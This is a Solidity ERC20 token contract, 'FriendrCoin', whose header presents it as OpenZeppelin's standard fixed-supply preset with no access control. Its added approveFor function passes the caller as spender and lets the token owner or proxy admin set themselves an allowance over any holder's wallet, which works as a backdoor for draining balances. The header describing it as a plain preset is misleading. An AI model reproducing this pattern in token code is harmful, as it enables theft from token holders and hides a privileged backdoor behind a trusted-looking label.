// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.0 (token/ERC20/presets/ERC20PresetFixedSupply.sol)
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";

/**
 * @dev {ERC20} token, including:
 *
 *  - Preminted initial supply
 *  - Ability for holders to burn (destroy) their tokens
 *  - No access control mechanism (for minting/pausing) and hence no governance
 *  - approveFor API allows caller contract to approve transactions on behalf of token holder
 *
 * This contract uses {ERC20Burnable} to include burn capabilities - head to
 * its documentation for details.
 *
 * _Available since v3.4._
 */
contract FriendrCoin is ERC20Burnable {
    address private tokenOwner;
    address private proxyAdmin;

    /**
     * @dev Mints `initialSupply` amount of token and transfers them to `owner`.
     *
     * See {ERC20-constructor}.
     */
    constructor(
        string memory name,
        string memory symbol,
        uint256 teamSupply,
        uint256 contractSupply,
        address owner,
        address _proxyAdmin
    ) ERC20(name, symbol) {
        tokenOwner = owner;
        proxyAdmin = _proxyAdmin;
        _mint(owner, teamSupply);
        _mint(_proxyAdmin, contractSupply);
        approve(proxyAdmin, contractSupply);
    }

    // Approve contract to make + and - transactions on a token holder's wallet
    function approveFor(address spender, uint256 amount) public returns (bool) {
        require(
            _msgSender() == tokenOwner || _msgSender() == proxyAdmin,
            "Only token owner or proxy admin is authorized to call this method"
        );
        _approve(spender, _msgSender(), amount);
        return true;
    }
}
